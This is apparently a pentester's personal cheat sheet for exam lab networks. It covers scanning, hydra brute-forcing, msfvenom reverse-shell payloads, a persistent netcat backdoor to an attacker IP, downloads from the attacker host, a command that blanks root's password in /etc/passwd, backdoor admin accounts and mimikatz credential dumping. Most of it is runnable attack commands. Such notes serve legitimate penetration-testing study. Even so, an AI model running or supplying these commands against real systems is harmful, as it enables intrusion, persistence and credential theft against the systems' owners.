Notes
Enumeration
Scan IPs to a CSV file:

cd /mnt/hgfs/Shared/Exam
mkdir hosts
ruby scan.rb tcp 10.11.1.220 10.11.1.221 10.11.1.44 10.11.1.218 10.11.1.219
ruby scan.rb udp 10.11.1.220 10.11.1.221 10.11.1.44 10.11.1.218 10.11.1.219
ruby scan_to_csv.rb > hosts.csv
Do a ping sweep:

nmap -sn 10.11.1.0/24 -oG ips.txt
cat ips.txt | awk '{print $2}' | grep -v Nmap > ips.txt
Find hidden ports: nmap -v -sS -p- -T4 10.11.1.49

Increase nmap speed T2/--disable-arp-ping

Enum4linux from smb ports: enum4linux -a 10.11.1.5

Wireshark

Capture all traffic from an IP src net 192.168.0.1
Specify port tcp dst port 123
Smb (139 & 445)

$ enum4linux -a 10.11.1.5
$ smbclient -L //10.11.1.5 -U ''
$ smbclient //10.11.1.5/Share -U ''
Can you do dir traversal?
OS Discovery? nmap -p 139,445 --script smb-os-discovery 10.11.1.136
Scan for vulns: nmap -p 139,445 -Pn --script=smb-vuln-*.nse 10.11.1.5
HTTP (80 & 443)

$ gobuster -u http://192.168.26.53 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -e > scans/gobuster_dirs
# => /internal/
$ gobuster -u http://192.168.26.53 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -e > scans/gobuster_files
$ nikto -h 10.11.1.8 > scans/nikto
Checklist:

/cgi-bin check for shellshock?
is webdav enabled? (cadaver)
check source code for hidden paths
cookies?
Check for web app source code and version on github
https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3

SNMP (UDP 161)

onesixtyone
snmp-check
Exploitation
Brute force logins:

SSH:

hydra -f -l bob -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.11.1.136 -t 4 ssh
FTP:

cp /usr/share/seclists/Usernames/top-usernames-shortlist.txt usernames.txt
hydra -L usernames.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt -V 10.11.1.146 ftp
HTTP POST:

hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.11.1.251 -V http-form-post '/wp/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:Incorrect'
HTTP Basic Auth:

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt 10.11.1.202 -V http-get /localstart.asp
Msfvenom:

# Windows meterpreter:
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe EXITFUNC=thread LHOST=192.168.43.31 LPORT=445 > meterpreter.exe
# Windows reverse TCP:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.31 LPORT=443 -e x86/shikata_ga_nai -f exe > reverse_shell_443.exe
# Linux reverse TCP:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.43.31 LPORT=443 -f elf -o reverse_shell
# Java reverse TCP:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.43.31 LPORT=443 -f war > payload.war
# PHP Reverse TCP:
msfvenom -p php/reverse_php LHOST=192.168.43.31 LPORT=4443 -f raw > shell.php
# Python Reverse TCP:
msfvenom -p python/shell_reverse_tcp LHOST=192.168.43.31 LPORT=443 -f raw > shell.py
Download a file via ftp:

echo open 192.168.43.31 21> ftp.txt && echo USER test pass>> ftp.txt && echo ftp>> ftp.txt && echo bin >> ftp.txt && echo GET churrasco.exe >> ftp.txt && echo bye >> ftp.txt && ftp -v -n -s:ftp.txt
Persistent reverse shell in linux:

cd /var/tmp
echo 'while [ 1 ]; do sleep 3; nc -n 192.168.43.31 445 -e /bin/bash &>/dev/null; done' > backdoor.sh
chmod +x backdoor.sh
nohup ./backdoor.sh &
Hashcat tip: sudo apt install ocl-icd-libopencl1

Crack a password from /etc/passwd:

$ cd ~/Downloads/hashcat-4.1.0
$ echo "$P$B9wJdX0NkO95U2L.kqAGXsFufwSp5N1" > hashes.txt
$ ./hashcat64.bin -m 400 hashes.txt rockyou.txt
Crack a password from fgdump: https://hashcat.net/wiki/doku.php?id=example_hashes

$ cd ~/Downloads/hashcat-4.1.0
$ echo "F26276DDAAB15F96872B4FAD17E5759B" > hashes.txt
$ ./hashcat64.bin -m 1000 hashes.txt rockyou.txt
Sniff packets:

tcpdump -n src host 172.16.40.10
tcpdump -n dst host 172.16.40.10
Privilege Escalation (Linux)
TTY Shell:

python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
Download priv esc scripts:

wget http://192.168.43.31/linuxprivchecker.py
wget http://192.168.43.31/linenum.sh
wget http://192.168.43.31/unix-privesc-check
Change root to passwordless:

echo "echo root::0:0:root:/root:/bin/bash > /etc/passwd" > /tmp/run
Add a root user :

adduser hacker
usermod -aG sudo hacker
echo "%hacker        ALL=(ALL)       ALL" >> /etc/sudoers
sudo su
Port forward ssh:

service ssh start
ssh -R 631:localhost:631 root@192.168.43.31
local: -L Specifies that the given port on the local (client) host is to be forwarded to the given host and port on the remote side.
ssh -L sourcePort:forwardToHost:onPort connectToHost connect with ssh to connectToHost, and forward all connection attempts to the local sourcePort to port onPort on the machine called forwardToHost, which can be reached from the connectToHost machine.
remote: -R Specifies that the given port on the remote (server) host is to be forwarded to the given host and port on the local side.
ssh -R sourcePort:forwardToHost:onPort connectToHost connect with ssh to connectToHost, and forward all connection attempts to the remote sourcePort to port onPort on the machine called forwardToHost, which can be reached from your local machine.
Example:

ssh -L \*:10443:localhost:10443 root@192.168.43.31
Privilege Escalation (Windows)
Follow these guides: https://github.com/absolomb/Pentesting/blob/master/guides/WindowsPrivEsc.md https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ http://www.fuzzysecurity.com/tutorials/16.html

Search for files containing string:

findstr /si password
Search for files by name:

dir wmi* /s /p
Show hidden files and folders:

dir /adh
Download files via ftp:

echo open 192.168.43.31 21> ftp.txt && echo USER test pass>> ftp.txt && echo ftp>> ftp.txt && echo bin >> ftp.txt && echo GET fgdump.exe >> ftp.txt && echo bye >> ftp.txt && ftp -v -n -s:ftp.txt
Port forward 445 (victim) to 4443 (attacker):

$ service ssh start
> plink.exe -l offsec -pw pass -R 4443:127.0.0.1:445 192.168.43.31
Determine windows version: https://www.forensicswiki.org/wiki/Determining_OS_version_from_an_evidence_image https://stackoverflow.com/questions/14648796/

type %windir%\system32\eula.txt

Use jaws script: https://github.com/411Hall/JAWS

Add an admin user:

net user hacker password /add
net localgroup administrators brett /add
Download mimikatz:

gftp mimikatz/Win32/mimikatz.exe
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
